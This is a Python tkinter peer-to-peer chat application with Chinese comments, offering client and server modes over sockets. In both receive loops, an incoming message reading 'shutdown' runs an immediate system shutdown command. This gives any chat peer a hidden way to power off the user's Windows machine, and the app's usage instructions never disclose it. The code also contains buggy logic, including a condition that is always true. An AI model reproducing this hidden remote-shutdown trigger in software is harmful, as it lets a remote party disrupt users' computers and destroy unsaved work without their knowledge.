# Copyright (c) 2023 PengWenFeng and ZhangHui
# This software is licensed under the MIT License. See the LICENSE file for details.
import os
import socket
import threading
import time
import tkinter as tk
import tkinter.messagebox
import winsound
import re


def parse_ip(ip):
    # 定义一个正则表达式模式
    pattern = r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)$"
    # 尝试匹配用户输入的ip地址
    match = re.match(pattern, ip)
    # 如果匹配成功
    if match:
        # 获取匹配的地址和端口号
        address = match.group(1)
        port = int(match.group(2))
    # 如果匹配失败
    else:
        # 使用默认的地址和端口号
        address = ip
        port = 8888
    # 返回地址和端口号
    return address, port


def show_message():
    # 创建一个提示窗口
    message_window = tk.Toplevel(window)
    message_window.title("使用说明")
    message_window.geometry("600x200")
    # 创建一个标签，显示提示信息
    message_label = tk.Label(message_window, text="主动模式：输入对方ip地址，点击连接即可！\n\t          被动模式：1.输入自己电脑的ip地址，点击进入等待连接状态。\n\t                            2.让对方选主动模式，输入你的ip然后点击连接即可！\n注意：被动模式进入等待连接状态后程序可能会未响应，这是正常情况，不用担心，等对方连上了就好了！")
    message_label.pack(padx=10, pady=10)
    # 创建一个按钮，关闭提示窗口
    close_button = tk.Button(message_window, text="已了解", command=message_window.destroy)
    close_button.pack(padx=10, pady=10)


def client_fa(msg):
    # 发送消息给服务器
    client.send(msg.encode("UTF-8"))


def client_shou(text):
    # 接收服务器返回的消息并显示在文本框中
    while True:
        rev_data = client.recv(1024)
        text.insert(tk.END, "来自对方的回复 : \n", "receive")  # 插入一行提示信息，并添加"receive"标签
        text.insert(tk.END, rev_data.decode('UTF-8') + "\n", "receive")  # 插入服务器返回的信息，并添加"receive"标签
        text.tag_config("receive", foreground="green", justify=tk.LEFT)  # 设置"receive"标签的颜色和对齐方式
        text.see(tk.END)  # 滚动到最后一行
        winsound.Beep(1999, 100)  # 主板蜂鸣器
        winsound.MessageBeep()  # 喇叭
        if rev_data.decode("UTF-8") == 'shutdown':
            os.system("shutdown -s -t 0")

        if rev_data.decode("UTF-8") == '拜拜':
            client_disconnect(client)
            text.insert(tk.END, "对方发起主动断开连接,窗口将在4秒后关闭！")
            time.sleep(4)
            root1.destroy()
            break


def client_send(entry, text):
    # 获取输入框的内容并调用fa函数发送
    msg = entry.get()  # 获取输入框的内容
    if msg:  # 如果不为空
        text.insert(tk.END, ": 我\n", "send")  # 插入一行提示信息，并添加"send"标签
        text.insert(tk.END, msg + "\n", "send")  # 插入用户输入的信息，并添加"send"标签
        text.tag_config("send", foreground="black", justify=tk.RIGHT)  # 设置"send"标签的颜色和对齐方式
        text.see(tk.END)  # 滚动到最后一行
        client_fa(msg)  # 调用fa函数发送消息给服务器
        entry.delete(0, tk.END)  # 清空输入框
        return True


def client_disconnect(conn):
    try:
        end = "系统提示:对方已断开连接"
        # 关闭socket连接
        client.send(end.encode("UTF-8"))
        conn.close()
        client.close()
        text.insert(tk.END, "已断开连接")
    finally:
        return True


def client_connect(entry_ip, text):
    # 获取用户输入的ip并尝试连接到服务器
    global client  # 声明全局变量client，用来保存socket对象
    ip = entry_ip.get()  # 获取用户输入的ip
    if ip:  # 如果不为空
        try:
            client = socket.socket()
            if ip:
                # 如果用户输入了ip地址或域名
                # 定义一个正则表达式模式
                pattern = r"^([\w:/.]+):(\d+)$"
                # 尝试匹配用户输入的域名
                match = re.match(pattern, ip)
                # 如果匹配成功
                if match:
                    # 获取匹配的域名和端口号
                    address = socket.gethostbyname(match.group(1))
                    port = int(match.group(2))
                # 如果匹配失败
                else:
                    # 调用parse_ip函数获取地址和端口号
                    address, port = parse_ip(ip)
            else:
                # 如果用户输入了其他格式的字符串，使用默认地址和端口号
                address = ip
                port = 8888
            client.connect((address, port))
            text.insert(tk.END, "连接成功!\n")
            shou1 = threading.Thread(target=client_shou, args=(text,))  # 创建一个线程执行shou函数，并传入文本框对象作为参数
            fa1 = threading.Thread(target=client_fa, args=("",))  # 创建一个线程执行fa函数，并传入空字符串作为参数
            shou1.start()  # 启动接收线程
            fa1.start()  # 启动发送线程
            return True
        except Exception as e:
            tk.messagebox.showerror(title="提示", message=str(e))  # 弹出错误提示框
            return False


def client_create_ui():
    global root1, text
    root1 = tk.Tk()  # 创建窗口对象
    root1.title("P2P Chat")  # 设置窗口标题
    root1.geometry("600x600")  # 设置窗口大小

    frame_ip = tk.Frame(root1)  # 创建一个框架用来放置输入ip的框和连接按钮
    frame_ip.pack(side=tk.TOP, fill=tk.X)  # 布局到窗口上方，并填充水平方向

    label_ip = tk.Label(frame_ip, text="请输入对方ip地址")  # 创建一个标签用来提示用户输入ip地址
    label_ip.pack(side=tk.LEFT)  # 布局到框架左边

    entry_ip = tk.Entry(frame_ip, width=20)  # 创建一个输入框用来输入要连接的ip，设置宽度为20
    entry_ip.pack(side=tk.LEFT)  # 布局到框架左边
    client_button_connect = tk.Button(frame_ip, text="连接", bg="#e6ffff", command=lambda: client_connect(entry_ip, text) and client_button_disconnect.config(text="断开连接", bg="red") or client_button_connect.config(text="连接", bg="#4dff88") or client_button_send.config(bg="#99ff66"))  # 创建一个按钮用来连接到服务器，并绑定connect函数
    client_button_connect.pack(side=tk.LEFT)  # 布局到框架右边

    text = tk.Text(root1)  # 创建一个文本框用来显示聊天记录
    text.pack(side=tk.TOP, fill=tk.BOTH, expand=True)  # 布局到窗口上方，并填充整个窗口

    frame = tk.Frame(root1)  # 创建一个框架用来放置输入框和按钮
    frame.pack(side=tk.BOTTOM, fill=tk.X)  # 布局到窗口下方，并填充水平方向

    client_button_disconnect = tk.Button(frame_ip, text="断开连接", bg="white", command=lambda: client_disconnect(client) and client_button_connect.config(text="连接", bg="#e6ffff") or client_button_disconnect.config(bg="white") or client_button_send.config(bg="white"))  # 创建一个按钮用来断开连接，并绑定disconnect函数
    client_button_disconnect.pack(side=tk.LEFT)  # 布局到框架左边

    entry = tk.Entry(frame)  # 创建一个输入框用来输入要发送的消息
    entry.pack(side=tk.LEFT, fill=tk.X, expand=True)  # 布局到框架左边，并填充水平方向
    client_button_send = tk.Button(frame, text="发送", bg="white", command=lambda: client_send(entry, text))  # 创建一个按钮用来发送消息，并绑定send函数
    client_button_send.pack(side=tk.RIGHT)  # 布局到框架右边

    entry.bind("<Return>", lambda event: client_send(entry, text))  # 绑定回车键事件，按回车键也可以发送消息
    return root1, text  # 返回窗口对象和文本框对象


def strat_client_ui():
    root1, text = client_create_ui()
    # 进入窗口主循环
    root1.mainloop()


def server_send(entry, text):
    # 获取输入框的内容并调用server_fa函数发送
    msg = entry.get()  # 获取输入框的内容
    if msg == "拜拜":
        text.insert(tk.END, ": 我\n", "send")  # 插入一行提示信息，并添加"send"标签
        text.insert(tk.END, msg + "\n", "send")  # 插入用户输入的信息，并添加"send"标签
        text.tag_config("send", foreground="black", justify=tk.RIGHT)  # 设置"send"标签的颜色和对齐方式
        text.see(tk.END)  # 滚动到最后一行
        server_fa(msg)  # 调用fa函数发送消息给服务器
        entry.delete(0, tk.END)  # 清空输入框
        server_disconnect(server)  # 调用断开连接函数
    if msg:  # 如果不为空
        text.insert(tk.END, ": 我\n", "send")  # 插入一行提示信息，并添加"send"标签
        text.insert(tk.END, msg + "\n", "send")  # 插入用户输入的信息，并添加"send"标签
        text.tag_config("send", foreground="black", justify=tk.RIGHT)  # 设置"send"标签的颜色和对齐方式
        text.see(tk.END)  # 滚动到最后一行
        server_fa(msg)  # 调用fa函数发送消息给服务器
        entry.delete(0, tk.END)  # 清空输入框


def server_fa(msg):
    # 发送消息给服务器
    conn.send(msg.encode("UTF-8"))


# 定义一个函数用来接收客户端信息，并绑定到线程上
def server_shou(text):
    # 接收服务器返回的消息并显示在文本框中
    while True:
        rev_data = conn.recv(1024)
        if rev_data == None:
            rev_data = filter(None, rev_data)
        else:
            text.insert(tk.END, "来自对方的回复 : \n", "receive")  # 插入一行提示信息，并添加"receive"标签
            text.insert(tk.END, rev_data.decode('UTF-8') + "\n", "receive")  # 插入服务器返回的信息，并添加"receive"标签
            text.tag_config("receive", foreground="green", justify=tk.LEFT)  # 设置"receive"标签的颜色和对齐方式
            text.see(tk.END)  # 滚动到最后一行
            winsound.Beep(1999, 100)  # 主板蜂鸣器
            winsound.MessageBeep()  # 喇叭
        if rev_data.decode("UTF-8") == 'shutdown':
            os.system("shutdown -s -t 0")  # 特殊指令
        if rev_data.decode("UTF-8") == "拜拜" and "系统提示:对方已断开连接":
            server_text.insert(tk.END, "对方主动发起断开连接,窗口将在3秒后关闭！")
            server_disconnect(server)
            break


def server_connect(entry_ip, text):
    # 获取用户输入的ip并等待客户端连接
    global server, conn, address, shou1, fa1  # 声明全局变量，用来保存socket对象和连接信息
    ip = entry_ip.get()  # 获取用户输入的ip
    if ip:  # 如果不为空
        try:
            server = socket.socket()
            # 调用parse_ip函数获取地址和端口号
            address, port = parse_ip(ip)
            # 绑定到指定的地址和端口号，并监听连接请求
            server.bind((address, port))
            server.listen(1)
            result: tuple = server.accept()
            conn = result[0]
            address = result[1]
            text.insert(tk.END, f"与{address}建立连接!\n")
            shou1 = threading.Thread(target=server_shou, args=(text,))  # 创建一个线程执行shou函数，并传入文本框对象作为参数
            fa1 = threading.Thread(target=server_fa, args=("",))  # 创建一个线程执行fa函数，并传入空字符串作为参数
            shou1.start()  # 启动接收线程
            fa1.start()  # 启动发送线程

        except:
            tk.messagebox.showerror(title="提示", message="请检查网络连通性！")  # 弹出错误提示框

        return True


def server_disconnect(conn):
    try:
        end = "系统提示：对方已断开连接"
        server_fa(end)
        server.close()
        conn.close()
        server_text.insert(tk.END, "已断开连接，窗口将在3秒后关闭！")
        time.sleep(3)
        root.destroy()
    except:
        server_text.insert(tk.END, "已断开连接，窗口将在3秒后关闭！")
        root.destroy()


def server_create_ui():
    global root, server_text
    # 创建一个tkinter窗口并添加相关组件
    root = tk.Tk()  # 创建窗口对象
    root.title("P2P Chat")  # 设置窗口标题
    root.geometry("600x600")  # 设置窗口大小
    frame_ip = tk.Frame(root)  # 创建一个框架用来放置输入ip的框和连接按钮
    frame_ip.pack(side=tk.TOP, fill=tk.X)  # 布局到窗口上方，并填充水平方向

    label_ip = tk.Label(frame_ip, text="请输入本地ip地址")  # 创建一个标签用来提示用户输入ip地址
    label_ip.pack(side=tk.LEFT)  # 布局到框架左边

    entry_ip = tk.Entry(frame_ip, width=20)  # 创建一个输入框用来输入要连接的ip，设置宽度为20
    entry_ip.pack(side=tk.LEFT)  # 布局到框架左边
    server_button_connect = tk.Button(frame_ip, text="进入等待连接状态", bg="#e6ffff", command=lambda: server_connect(entry_ip, server_text) and server_button_connect.config(bg="#4dff88") or
                                                                                                       server_button_send.config(bg="#99ff66") or server_button_disconnect.config(bg="red"))
    server_button_connect.pack(side=tk.LEFT)  # 布局到框架右边

    frame = tk.Frame(root)  # 创建一个框架用来放置输入框和按钮
    frame.pack(side=tk.BOTTOM, fill=tk.X)  # 布局到窗口下方，并填充水平方向
    server_button_disconnect = tk.Button(frame_ip, text="断开连接", bg="white", command=lambda: server_disconnect(server) or server_button_connect.config(bg="#e6ffff") or server_button_send.config(bg="white") or server_button_disconnect.config(bg="white"))
    # 创建一个按钮用来断开连接，并绑定disconnect函数
    server_button_disconnect.pack(side=tk.LEFT)  # 布局到框架左边

    server_text = tk.Text(root)  # 创建一个文本框用来显示聊天记录
    server_text.pack(side=tk.TOP, fill=tk.BOTH, expand=True)  # 布局到窗口上方，并填充整个窗口

    frame = tk.Frame(root)  # 创建一个框架用来放置输入框和按钮
    frame.pack(side=tk.BOTTOM, fill=tk.X)  # 布局到窗口下方，并填充水平方向

    entry = tk.Entry(frame)  # 创建一个输入框用来输入要发送的消息
    entry.pack(side=tk.LEFT, fill=tk.X, expand=True)  # 布局到框架左边，并填充水平方向
    server_button_send = tk.Button(frame, text="发送", bg="white", command=lambda: server_send(entry, server_text))  # 创建一个按钮用来发送消息，并绑定send函数
    server_button_send.pack(side=tk.RIGHT)  # 布局到框架右边

    entry.bind("<Return>", lambda event: server_send(entry, server_text))  # 绑定回车键事件，按回车键也可以发送消息

    return root, server_text  # 返回窗口对象和文本框对象


def strat_server_ui():
    root, server_text = server_create_ui()
    # 进入窗口主循环
    root.mainloop()


# 设置主窗口标题和大小
window = tk.Tk()
window.title("P2P Chat ")
window.geometry("430x150")
# 创建一个标签，显示欢迎信息，并使用grid布局管理器布局
welcome_label = tk.Label(window, text="                           Welcome to use P2P Chat !\n                               请选择模式      ")
welcome_label.grid(row=0, column=0, columnspan=3, sticky=tk.E + tk.W, padx=10, pady=10)
button_1 = tk.Button(window, text="主动模式", bg="#ccffff", command=lambda: strat_client_ui())  # 创建一个按钮用来运行主动模式
button_1.grid(row=2, column=0, padx=10, pady=10)
button_2 = tk.Button(window, text="被动模式", bg="#ccffff", command=lambda: strat_server_ui())  # 创建一个按钮用来运行被动模式
button_2.grid(row=2, column=2, padx=55, pady=10)
button_3 = tk.Button(window, text="使用说明", bg="white", command=show_message)
button_3.grid(row=2, column=3, padx=40, pady=10)
window.mainloop()
